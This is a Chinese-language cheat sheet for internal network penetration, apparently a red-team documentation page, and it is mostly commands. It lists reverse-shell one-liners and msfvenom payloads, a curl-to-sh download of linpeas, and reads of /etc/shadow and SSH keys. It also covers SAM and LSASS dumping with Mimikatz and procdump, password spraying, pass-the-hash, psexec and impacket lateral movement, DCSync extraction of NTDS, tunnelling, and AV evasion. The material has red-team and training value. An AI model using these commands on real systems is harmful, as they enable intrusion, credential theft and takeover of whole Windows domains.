---
sidebar_label: '內網滲透基礎'
---

# 內網滲透概要


# Reverse shell

- rlwrap 做比較好用的shell
    - `rlwrap <reverse shell>` 

## Linux
- bash: `bash -c 'bash -i >& /dev/IP/PORT 0>&1'`
- Msfvenom
    - `msfvenom -p linux/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > s.elf`

## Windows

### reverse shell 
- Msfvenom
`msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > s.exe`

### Download
Windows：`certutil -urlcache -f URL OUTFILE`

## 白名單
- AV Bypass (Living Off The Land Binaries)：
    - https://lolbas-project.github.io/
- 提權腳本
    - https://gtfobins.github.io/

# Linux 後滲透

## information gathering

* hostname：電腦的名稱
* uname -a: 系統的核心版本
* ps aux / top：電腦的執行 process
* ifconfig / ip a：電腦的網路資訊
* pwd：當前的資料夾
* w：登入的 TTY 資訊
* cat /etc/passwd：電腦中的使用者資訊

## Privilege escalation (提權)

```
sudo -l
- https://gtfobins.github.io/
```
```
Linpeas
- curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### 拿到root之後
- `cat /etc/shadow`
    - dump password hash --> sha512($6$)

- `cat ~/.ssh/isa_key`
    - 拿key做維持權限
    - ssh -i `<key>`

## Port Forwarding(端口轉發 代理)
**用途：内網橫向、當作跳板**

【ATT&CK】端口轉發技術大全
https://mp.weixin.qq.com/s/FNCdKsPwu0_kD-4INn3faQ
https://mp.weixin.qq.com/s/zwaeUD7-QMTYgvymgw2EVQ

- Proxy Chains
    - sudo vim /etc/proxychains4.conf
    - socks5 127.0.0.1 9487
    - USAGE：`proxychains <command>`

- SSH Tunnel
    - Local Port Forwarding：`ssh -L [local_port]:[remote_host]:[remote_port] [user]@[ssh_server]`
    - Remote Port Forwarding：`ssh -R kali:<port> user@linux host`(受害主機)
    - Dynamic Port Forwarding：`ssh –D 127.0.0.1:9487 user@hostA`(受害主機)
    - socks server

- ligolo-ng
    - https://github.com/nicocha30/ligolo-ng
    - https://youtu.be/DM1B8S80EvQ?si=dLEPhijoF7_MBXV2
- Chisel
    - https://github.com/jpillora/chisel
- netsh portproxy (Windows)
    - `netsh interface portproxy add v4tov4 listenaddress=<ip> listenport=<port> connectaddress=<tgt_ip> connectport=<tgt_port>`
- reGeorg (AV會抓)
    - `https://github.com/sensepost/reGeorg`
        - tunnel.ashx 放在目標機上
        - 攻擊機上執行：`python2 reGeorgSocksProxy.py -u <target_url> -p <port>`
- Neo-reGeorg
    - https://github.com/L-codes/Neo-reGeorg
        - `python neoreg.py generate –k 密碼`
        - `python neoreg.py –k 密碼 –u 網址`

- 多層跳板：Venom (內網路由)：https://github.com/Dliv3/Venom

# Windows

* 我是誰：
    * whoami
    * echo %username%
* 我在哪：
    * hostname：電腦名稱
    * systeminfo：系統的各種資訊
    * tasklist：類似工作管理員
    * cd：不帶參數可以作為 linux 的 pwd 使用

## Privilege Escalation

```
NT Authority\System 高權限
NT Authority\Network Service
NT Authority\Local Service 平常在這
NT Authority\IUSR
```
### 漏洞利用
```python=
Windows Exploit Suggester - Next Generation (WES-NG)：
https://github.com/bitsadmin/wesng

- 匯出 systeminfo
# systeminfo > systeminfo.txt

- 更新資料庫
# python wes.py --update

- 比對弱點 --> 利用提權漏洞
# python wes.py systeminfo.txt -e
```

```
Winpeas
- https://github.com/carlospolop/PEASS-ng/releases/tag/20231011-b4d494e5
```
### 劫持 Token
- PrintSpoofer
    - Local/Network Service to SYSTEM
    - https://github.com/itm4n/PrintSpoofer
    - usage：`PrintSpoofer.exe -c "command"`

- Local Admin 比 Domain Admin 好拿
    - net localgroup “administrators”
    - net user administrator



### 密碼收集

#### SAM
> Security Account Manager，存儲用戶密碼
位置：`C:\Windows\System32\config\SAM`

匯出 SAM 檔：
`reg.exe` 
USAGE：
- `reg save HKLM\SAM <save_filename>`
- `reg save HKLM\SYSTEM <save_filename>`
    - Default file name：C:\inetpub\wwwroot\sam.zip

- `Invoke-NinjaCopy`：
    - Github:
https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1
`Invoke-NinjaCopy -Path SAM -LocalDestination SAM_COPY`

- 解析SAM
    - **pwdump.py**
    - samdump2


#### NTLM Hash
- online dehash: https://www.cmd5.com/ 
- Hashcat
    - hashcat -a 0 -m 1000 ntlm.hash pass.dict --force
- john
    - john ntlm.hash -w=pass.dict --format=NT 

### Password Spraying(密碼噴灑)
- 已知很多帳號，嘗試一種密碼做嘗試
- CrackMapExec：https://github.com/byt3bl33d3r/CrackMapExec
    - `cme <protocol> <target(s)> -u username -p password`
    - `cme <protocol> <target(s)> -u ~/file_usernames -p ~/file_passwords`
    - `cme smb 10.10.10.100 -u administrator -p Passw0rd`
    - `cme smb 10.10.10.100 -u administrator -p Passw0rd --local-auth`
    - `cme smb <filename> -u administrator -p Passw0rd --local-auth`
    
#### GPO

```
\\<domain>\SysVol\<domain>\Policie
\\<domain>\SysVol\<domain>\Policie\<UID>\Users\Scripts
\\<domain>\SysVol\<domain>\Policie\<UID>\Machine\Scripts
```

### Mimikatz
https://github.com/gentilkiwi/mimikatz/releases
- AV 可能會殺
- 微軟會將使用者憑證資訊暫存在 lsass.exe
- 取得 Administrator後使用
- 解析其記憶體內容，挖出帳號、Hash
- 管理員權限開啟
- `privilege::debug`：切換到 Debug 權限
    - `sekurlsa::logonpasswords`
        - 取得 LSASS 中的登入密碼
    - `misc::memssp`
        - 處理lsass內存，透過標識和patch函數以重定向執行來進行。


### Dump memory
- Procdump：https://docs.microsoft.com/zh-tw/sysinternals/downloads/procdump
    - 取得 minidump：`Procdump.exe -accepteula -ma lsass.exe lsass.dmp`
    - mimikatz：
`Sekurlsa::minidump “/To/PATH/lsass.dmp”`
`Sekurlsa::logonPasswords`

- 記憶體鑑識工具
    - Rekall
    - Volatility
    - Windbg


## Lateral Movement(橫向移動)
**用途：擴散**

### 做橫移前Recon：
- `echo %logonserver%`
- `nltest /dclist:<domain>`

### rdp
- xfreerdp：sudo apt-get install freerdp2-x11

### SMB
- port：139 (NetBIOS)
- Port：445

#### SMB Enumeration
- smbclient
- smbmap
- Crackmapexec

#### psexec
- 第一次使用先接受 eula
    - https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
    - psexec.exe -accepteula
- 使用psexec之前可以先用smbmap確認權限
- `smbmap -u jojo -d LAB -p Vampire@Mask -H 10.10.40.20`
- `psexec.exe -accepteula \\<ip> -u [<domain>\]<username> -p <password> cmd`

#### 網路芳鄰
`\\<ip>\c$`

#### 掛載遠端磁碟
```
- 掛載遠端磁碟
net use \\<ip>\C$ "<password>" /user:<username>
- 查看已掛載的遠端磁碟
net use
- Copy 檔案
copy mimikatz.exe \\<ip>\C$
```

#### impacket
https://github.com/SecureAuthCorp/impacket
`impacket-psexec jojo@10.10.40.20`
`proxychains psexec.py <username>:<passowrd>@<ip> whoami`

### CrackMapExec
`./cme smb [IP] -u administrator -p Passw0rd ‐‐exec‐method mmcexec ‐x 'whoami'`

### Pass the Hash

kali：`pth-winexe`
- 無法過 Proxychains
- 類似 Psexec，但支援以 Hash 代替密碼

usage：`pth-winexe -U <domain>/<username>%aad3b435b51404eeaad3b435b51404ee: <NTLM> //<IP> cmd`

On Windows：
`wmiexec.exe`：https://github.com/maaaaz/impacket-examples-windows/blob/master/wmiexec.exe

`wmiexec.exe -hashes <LM>:<NTLM> <domain>/<username>@<ip> <command>`

Mimikatz：
- must dump hashes first：`sekurlsa::pth/user:Administrator/domain:atomic.local/ntlm:cc36cf7a8514893efccd3324464tkg1a`

- Kerberos Ticket attack
`kerberos::ptt Administrator@krbtgt-atomic.LOCAL.kirbi`



### PowerShell Remoting
> - PowerShell Remoting only allows connections from members of the Administrators group
> - Members of the Remote Management Users group can access WMI resources over management protocols

PowerShell Remoting (and WinRM) listen on the following ports:
- HTTP: 5985
- HTTPS: 5986

#### tools：
- https://github.com/Hackplayers/evil-winrm

# AD
- DC (Domain Controller)
- RODC (Read-Only Domain Controller)

- 加入 AD
    - DNS 指向 AD
    - 將系統加入 AD
    - 使用網域帳號登入

## DC
DC 與 DNS 通常是同一台

做橫移前Recon：
- `echo %logonserver%`
- `nltest /dclist:<domain>`

DC common port list：
```
- Port 389 LDAP
- Port 636 LDAP over SSL
- Port 88 Kerberos Authentication
- Port 3268 Global catalog Search
- Port 3269 Global catalog LDAP over SSL
```

## information 
### 查詢 Local User
- `net user`
- `net user <username>`

### 查詢 Domain User
- `net user /domain`
- `net user <username> /domain`
    
### 預設高權限群組
- net groups /domain
- net groups "Domain Admins" /domain
- net groups "Schema Admins" /domain
- net groups "Enterprise Admins" /domain

#### LDAP 簡介：
- DN:Distinguish Name
- CN: Common Name
- OU:Organization Unit Name
- DC: Domain Componet

```
kali
ldapsearch -x -h <ip> -D ‘user@domain' -w ‘password' -b 'dc=code2021,dc=tw' '(ObjectClass=user)'
```

## Recon

### Windows ADRecon.ps1
```
- https://github.com/adrecon/ADRecon
usage：powershell.exe –nop –ep bypass .\adrecon.ps1 -DomainController 10.10.40.168 -Credential LAB\peko

Install-windowsfeature RSAT
```

### BloodHoundAD
    - https://github.com/BloodHoundAD/BloodHound/releases/tag/4.0.3
    - Collectors：https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
    - .\sharphound.exe -c all
    - SharpHound.ps1
        - 自動打包：Timestamp_BloodHound.zip --> 拖到視窗

## Exploit

### DcSync

- 本地址用者資料庫 C:\windows\system32\config\SAM
- 網域使用者資料庫 C:\Windows\NTDS\NTDS.dit
    - DcSync 就是把 NTDS.dit 的資料導出來
- cme：`cme smb <dc_ip> -H <hash> -d <domain> -u <username> --ntds`
-  Mimikatz
    -  切到 Domain Admin 帳戶 (會彈出新的 cmd 視窗)
    1. `privilege::debug`
    2. `sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<ntlm>`
    3. 再啟用後：`lsadump::dcsync /all`

- Neo4j Server
    - https://neo4j.com/download-center/#community
    - path/to/neo4j/bin$ ./neo4j console
    - 啟動後至 localhost:7474 修改預設密碼
    - 預設帳密 neo4j/neo4j 登入 BloodHoundAD